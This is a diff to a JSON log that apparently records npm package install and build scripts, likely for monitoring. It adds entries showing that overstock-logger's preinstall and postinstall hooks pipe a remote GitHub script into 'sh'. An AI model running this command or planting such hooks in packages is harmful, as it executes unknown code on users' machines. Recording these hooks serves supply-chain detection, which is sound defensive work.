@@ -1,5 +1,32 @@
 [
   {
+    "packageName": "jbrowse-plugin-msaview",
+    "version": "2.2.4",
+    "scriptType": "prebuild",
+    "scriptContent": "yarn clean",
+    "previousVersion": "2.2.3",
+    "timestamp": "2026-01-25T20:14:44.999Z",
+    "issuesend": false
+  },
+  {
+    "packageName": "overstock-logger",
+    "version": "3.12.3",
+    "scriptType": "postinstall",
+    "scriptContent": "curl \"https://raw.githubusercontent.com/cyberX3993/wordlists/refs/heads/main/b\" | sh ",
+    "previousVersion": "3.11.3",
+    "timestamp": "2026-01-25T20:14:31.579Z",
+    "issuesend": false
+  },
+  {
+    "packageName": "overstock-logger",
+    "version": "3.12.3",
+    "scriptType": "preinstall",
+    "scriptContent": "curl \"https://raw.githubusercontent.com/cyberX3993/wordlists/refs/heads/main/b\" | sh  ",
+    "previousVersion": "3.11.3",
+    "timestamp": "2026-01-25T20:14:31.577Z",
+    "issuesend": false
+  },
+  {
     "packageName": "ralphy-cli",
     "version": "4.6.0",
     "scriptType": "prebuild",
